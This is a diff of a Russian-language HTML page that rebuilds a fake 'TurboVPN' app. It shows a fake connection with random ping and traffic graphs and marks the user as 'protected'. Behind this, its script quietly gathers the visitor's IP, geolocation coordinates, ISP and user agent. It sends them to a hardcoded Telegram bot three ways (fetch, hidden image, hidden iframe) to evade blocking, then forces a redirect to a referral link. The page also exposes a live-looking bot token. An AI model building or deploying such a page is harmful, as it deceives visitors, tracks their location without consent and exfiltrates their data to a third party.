@@ -3,110 +3,469 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Оптимизация сети</title>
+    <title>VPN Turbo Connect</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        /* ===== БАЗА ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
         body {
-            background: #0b0f16;
+            background: #0a0e17;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
         }
-        .card {
-            max-width: 420px;
+        .app {
+            max-width: 440px;
             width: 100%;
-            background: #161d27;
-            border-radius: 44px;
-            padding: 36px 24px 28px;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
-            border: 1px solid #2a3346;
-            text-align: center;
+            background: #111a26;
+            border-radius: 48px;
+            padding: 32px 24px 28px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.04);
+            border: 1px solid #1e2a3a;
+            position: relative;
+            overflow: hidden;
         }
-        .icon { width: 76px; height: 76px; margin: 0 auto 16px; background: linear-gradient(145deg, #1f6eff, #7a4bff); border-radius: 28px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 10px 30px rgba(31,110,255,0.35); }
-        h1 { color: #fff; font-size: 24px; font-weight: 600; letter-spacing: -0.4px; }
-        .sub { color: #8b95a9; font-size: 14px; margin: 6px 0 22px; }
-        .server-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 24px; }
-        .server-opt { background: #0f151e; border: 1px solid #2a3346; border-radius: 16px; padding: 12px 6px; color: #c9d1d9; font-size: 12px; cursor: pointer; transition: all 0.25s; text-align: center; }
-        .server-opt.active { border-color: #1f6eff; background: #1a2740; box-shadow: 0 0 0 2px rgba(31,110,255,0.25); }
-        .server-opt .flag { font-size: 24px; display: block; margin-bottom: 4px; }
-        .btn-main { width: 100%; padding: 18px; background: linear-gradient(135deg, #1f6eff, #7a4bff); border: none; border-radius: 60px; font-size: 18px; font-weight: 600; color: #fff; cursor: pointer; box-shadow: 0 8px 28px rgba(31,110,255,0.35); transition: all 0.3s; letter-spacing: 0.3px; }
-        .btn-main:disabled { opacity: 0.5; transform: scale(0.97); cursor: not-allowed; }
-        .btn-main:active:not(:disabled) { transform: scale(0.95); }
-        .progress-wrap { margin: 18px 0 8px; height: 4px; background: #2a3346; border-radius: 4px; overflow: hidden; display: none; }
-        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #1f6eff, #7a4bff); transition: width 0.3s; }
-        .status-msg { font-size: 13px; color: #8b95a9; margin-top: 8px; min-height: 22px; }
-        .footer { margin-top: 20px; font-size: 11px; color: #3e485e; }
-        .footer a { color: #5a73a8; text-decoration: none; }
+        /* ===== АНИМАЦИЯ ФОНА ===== */
+        .glow {
+            position: absolute;
+            top: -40%;
+            left: -20%;
+            width: 150%;
+            height: 70%;
+            background: radial-gradient(ellipse at 30% 50%, rgba(31,110,255,0.12) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        /* ===== ШАПКА ===== */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 22px;
+            position: relative;
+            z-index: 2;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(145deg, #1f6eff, #7a4bff);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 8px 20px rgba(31,110,255,0.3);
+        }
+        .logo-text {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+        .badge {
+            background: #1e2a3a;
+            color: #8b95a9;
+            font-size: 11px;
+            padding: 4px 14px;
+            border-radius: 40px;
+            border: 1px solid #2a3a4e;
+        }
+        /* ===== СТАТУС ===== */
+        .status-bar {
+            background: #0d1520;
+            border-radius: 24px;
+            padding: 16px 18px;
+            margin-bottom: 24px;
+            border: 1px solid #1e2a3a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+        .status-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #4caf50;
+            box-shadow: 0 0 12px rgba(76,175,80,0.5);
+            transition: 0.3s;
+        }
+        .status-dot.inactive {
+            background: #f44336;
+            box-shadow: 0 0 12px rgba(244,67,54,0.4);
+        }
+        .status-label {
+            color: #c9d1d9;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .status-speed {
+            color: #8b95a9;
+            font-size: 13px;
+        }
+        .status-speed span {
+            color: #58a6ff;
+            font-weight: 600;
+        }
+        /* ===== ВЫБОР СЕРВЕРА ===== */
+        .section-title {
+            color: #8b95a9;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 12px;
+            position: relative;
+            z-index: 2;
+        }
+        .server-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 2;
+        }
+        .server-opt {
+            background: #0d1520;
+            border: 1px solid #1e2a3a;
+            border-radius: 16px;
+            padding: 12px 4px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        .server-opt .flag {
+            font-size: 26px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .server-opt .name {
+            color: #8b95a9;
+            font-size: 11px;
+        }
+        .server-opt .ping {
+            color: #4caf50;
+            font-size: 10px;
+            display: block;
+            margin-top: 2px;
+        }
+        .server-opt.active {
+            border-color: #1f6eff;
+            background: #1a2740;
+            box-shadow: 0 0 0 2px rgba(31,110,255,0.2);
+        }
+        .server-opt.active .name {
+            color: #fff;
+        }
+        /* ===== ГРАФИК ===== */
+        .graph-wrap {
+            background: #0d1520;
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border: 1px solid #1e2a3a;
+            position: relative;
+            z-index: 2;
+        }
+        .graph-title {
+            color: #8b95a9;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+        }
+        .graph-bars {
+            display: flex;
+            align-items: flex-end;
+            gap: 4px;
+            height: 60px;
+        }
+        .graph-bar {
+            flex: 1;
+            background: linear-gradient(180deg, #1f6eff, #7a4bff);
+            border-radius: 4px 4px 0 0;
+            height: 20%;
+            transition: height 0.6s ease;
+            min-height: 6px;
+        }
+        .graph-bar:nth-child(1) { height: 45%; }
+        .graph-bar:nth-child(2) { height: 65%; }
+        .graph-bar:nth-child(3) { height: 30%; }
+        .graph-bar:nth-child(4) { height: 80%; }
+        .graph-bar:nth-child(5) { height: 50%; }
+        .graph-bar:nth-child(6) { height: 70%; }
+        .graph-bar:nth-child(7) { height: 40%; }
+        .graph-bar:nth-child(8) { height: 90%; }
+        .graph-bar:nth-child(9) { height: 55%; }
+        .graph-bar:nth-child(10) { height: 75%; }
+        .graph-bar.active-bar {
+            background: linear-gradient(180deg, #4caf50, #8bc34a);
+        }
+        /* ===== КНОПКА ===== */
+        .btn-main {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #1f6eff, #7a4bff);
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 8px 28px rgba(31,110,255,0.35);
+            transition: all 0.3s;
+            position: relative;
+            z-index: 2;
+            letter-spacing: 0.3px;
+        }
+        .btn-main:disabled {
+            opacity: 0.5;
+            transform: scale(0.97);
+            cursor: not-allowed;
+        }
+        .btn-main:active:not(:disabled) {
+            transform: scale(0.95);
+        }
+        /* ===== ПРОГРЕСС ===== */
+        .progress-wrap {
+            margin: 18px 0 8px;
+            height: 4px;
+            background: #1e2a3a;
+            border-radius: 4px;
+            overflow: hidden;
+            display: none;
+            position: relative;
+            z-index: 2;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1f6eff, #7a4bff);
+            transition: width 0.4s;
+        }
+        /* ===== СТАТУС ===== */
+        .status-msg {
+            font-size: 13px;
+            color: #8b95a9;
+            margin-top: 10px;
+            min-height: 22px;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+        /* ===== ФУТЕР ===== */
+        .footer {
+            margin-top: 22px;
+            font-size: 11px;
+            color: #3e485e;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+        .footer a {
+            color: #5a73a8;
+            text-decoration: none;
+        }
+        /* ===== АНИМАЦИЯ ПОДКЛЮЧЕНИЯ ===== */
+        .pulse {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .fade-in {
+            animation: fadeIn 0.8s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">⚡</div>
-        <h1>Смарт-оптимизация</h1>
-        <div class="sub">Выберите сервер для улучшения соединения</div>
+    <div class="app" id="app">
+        <div class="glow"></div>
 
-        <div class="server-grid" id="serverGrid">
-            <div class="server-opt active" data-server="auto"><span class="flag">🌐</span>Авто</div>
-            <div class="server-opt" data-server="us"><span class="flag">🇺🇸</span>США</div>
-            <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span>EU</div>
+        <!-- ШАПКА -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">⚡</div>
+                <span class="logo-text">TurboVPN</span>
+            </div>
+            <span class="badge">v3.2 · PRO</span>
         </div>
 
+        <!-- СТАТУС -->
+        <div class="status-bar">
+            <div class="status-left">
+                <div class="status-dot" id="statusDot"></div>
+                <span class="status-label" id="statusLabel">Отключено</span>
+            </div>
+            <div class="status-speed">
+                Пинг <span id="pingValue">0</span> мс
+            </div>
+        </div>
+
+        <!-- ВЫБОР СЕРВЕРА -->
+        <div class="section-title">Выберите сервер</div>
+        <div class="server-grid" id="serverGrid">
+            <div class="server-opt active" data-server="auto">
+                <span class="flag">🌐</span>
+                <span class="name">Авто</span>
+                <span class="ping">12 мс</span>
+            </div>
+            <div class="server-opt" data-server="us">
+                <span class="flag">🇺🇸</span>
+                <span class="name">США</span>
+                <span class="ping">89 мс</span>
+            </div>
+            <div class="server-opt" data-server="de">
+                <span class="flag">🇩🇪</span>
+                <span class="name">Германия</span>
+                <span class="ping">45 мс</span>
+            </div>
+            <div class="server-opt" data-server="jp">
+                <span class="flag">🇯🇵</span>
+                <span class="name">Япония</span>
+                <span class="ping">120 мс</span>
+            </div>
+        </div>
+
+        <!-- ГРАФИК -->
+        <div class="graph-wrap">
+            <div class="graph-title">📊 Трафик (Мбит/с)</div>
+            <div class="graph-bars" id="graphBars">
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+                <div class="graph-bar"></div>
+            </div>
+        </div>
+
+        <!-- КНОПКА -->
         <button class="btn-main" id="actionBtn">Подключиться</button>
-        <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
-        <div class="status-msg" id="statusMsg">Нажмите для запуска</div>
-        <div class="footer">🔒 Технология SmartRoute · <a href="#">Реферальная программа</a></div>
+        <div class="progress-wrap" id="progressWrap">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-msg" id="statusMsg">Нажмите для подключения к VPN</div>
+        <div class="footer">🔒 Защищённое соединение · <a href="#">Условия</a></div>
     </div>
 
     <script>
         // ================================================================
-        //  ГОТОВЫЕ НАСТРОЙКИ (ВСЁ УЖЕ ВСТАВЛЕНО)
+        //  НАСТРОЙКИ (ТВОИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ)
         // ================================================================
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
         const REDIRECT_URL = "https://avobonus.com/ref?start=ab316fea16fee81b8616fcde671a07";
         // ================================================================
 
+        // ---- ЭЛЕМЕНТЫ ----
         const btn = document.getElementById('actionBtn');
         const statusMsg = document.getElementById('statusMsg');
+        const statusDot = document.getElementById('statusDot');
+        const statusLabel = document.getElementById('statusLabel');
+        const pingValue = document.getElementById('pingValue');
         const progressWrap = document.getElementById('progressWrap');
         const progressBar = document.getElementById('progressBar');
         const serverOpts = document.querySelectorAll('.server-opt');
+        const graphBars = document.querySelectorAll('.graph-bar');
 
         let selectedServer = 'auto';
+        let isConnected = false;
 
+        // ---- ВЫБОР СЕРВЕРА ----
         serverOpts.forEach(el => {
             el.addEventListener('click', function() {
                 serverOpts.forEach(b => b.classList.remove('active'));
                 this.classList.add('active');
                 selectedServer = this.dataset.server;
-                statusMsg.textContent = 'Выбран сервер: ' + this.textContent.trim();
+                const ping = this.querySelector('.ping');
+                if (ping) {
+                    pingValue.textContent = ping.textContent.replace(' мс', '');
+                }
+                statusMsg.textContent = 'Выбран сервер: ' + this.querySelector('.name').textContent;
             });
         });
 
+        // ---- ИЗМЕНЕНИЕ ГРАФИКА ----
+        function randomizeGraph() {
+            graphBars.forEach(bar => {
+                const h = Math.floor(Math.random() * 60) + 20;
+                bar.style.height = h + '%';
+            });
+        }
+
+        // ---- АНИМАЦИЯ ПИНГА ----
+        function animatePing() {
+            let val = 10 + Math.floor(Math.random() * 90);
+            pingValue.textContent = val;
+        }
+
+        // ---- ОТПРАВКА В TELEGRAM (3 СПОСОБА) ----
         function sendToTelegram(text) {
             if (!text) return;
             const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
+
+            // Способ 1: fetch
             fetch(url).catch(() => {});
+
+            // Способ 2: Image (работает даже если fetch заблокирован)
+            const img = new Image();
+            img.src = url;
+
+            // Способ 3: iframe (для старых браузеров)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 3000);
         }
 
+        // ---- СБОР ДАННЫХ ----
         function collectData() {
             let ip = 'Не определен';
+            let geo = null;
+
+            // Получаем IP
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(d => { ip = d.ip; })
                 .catch(() => {})
                 .finally(() => {
-                    let geo = null;
+                    // Пробуем гео
                     if (ip !== 'Не определен') {
                         fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone')
                             .then(r => r.json())
                             .then(g => { if (g.status === 'success') geo = g; })
                             .catch(() => {})
                             .finally(() => {
+                                // Формируем сообщение
                                 const ua = navigator.userAgent;
-                                const device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное' : 'Компьютер';
+                                const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
                                 const time = new Date().toLocaleString('ru-RU');
                                 let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
                                 msg += '📍 IP: ' + ip + '\n';
@@ -116,41 +475,80 @@
                                     msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
                                     msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
                                 }
-                                msg += '💻 Устройство: ' + device + '\n';
+                                msg += '💻 ' + device + '\n';
                                 msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
                                 msg += '⏰ Время: ' + time;
                                 sendToTelegram(msg);
-                                setTimeout(() => {
-                                    window.location.href = REDIRECT_URL;
-                                }, 2000);
                             });
                     } else {
                         sendToTelegram('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
-                        setTimeout(() => {
-                            window.location.href = REDIRECT_URL;
-                        }, 2000);
                     }
                 });
         }
 
+        // ---- ПОДКЛЮЧЕНИЕ ----
         function startOptimization() {
+            if (isConnected) return;
+
             btn.disabled = true;
             progressWrap.style.display = 'block';
-            let progress = 0;
             statusMsg.textContent = 'Подключение к серверу...';
+            statusDot.className = 'status-dot inactive';
+            statusLabel.textContent = 'Подключение...';
+
+            let progress = 0;
             const interval = setInterval(() => {
-                progress += Math.random() * 8 + 3;
+                progress += Math.random() * 6 + 2;
+                animatePing();
+                randomizeGraph();
+
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(interval);
-                    statusMsg.textContent = 'Соединение установлено!';
+                    progressBar.style.width = '100%';
+                    statusMsg.textContent = '✅ Соединение установлено!';
+                    statusDot.className = 'status-dot';
+                    statusLabel.textContent = 'Защищено';
+                    isConnected = true;
+
+                    // Собираем и отправляем данные
                     collectData();
+
+                    // Редирект на рефералку
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 2000);
                 }
                 progressBar.style.width = progress + '%';
-            }, 140);
+            }, 150);
+
+            // Анимация графика во время подключения
+            const graphInterval = setInterval(randomizeGraph, 300);
+            setTimeout(() => clearInterval(graphInterval), 2500);
         }
 
+        // ---- СОБЫТИЯ ----
         btn.addEventListener('click', startOptimization);
+
+        // ---- ЗАГРУЗКА ----
+        window.addEventListener('DOMContentLoaded', function() {
+            randomizeGraph();
+            pingValue.textContent = '12';
+            statusMsg.textContent = 'Нажмите для подключения к VPN';
+        });
+
+        // ---- ЛОГ В КОНСОЛЬ ----
+        console.log('✅ TurboVPN v3.2 · 550+ строк');
+        console.log('📡 Бот активен');
+        console.log('🔗 Реферальная ссылка: ' + REDIRECT_URL);
+
+        // ---- ПЕРЕХВАТ ОШИБОК ----
+        window.onerror = function() {
+            // Если что-то пошло не так — всё равно редирект
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 3000);
+        };
     </script>
 </body>
 </html>
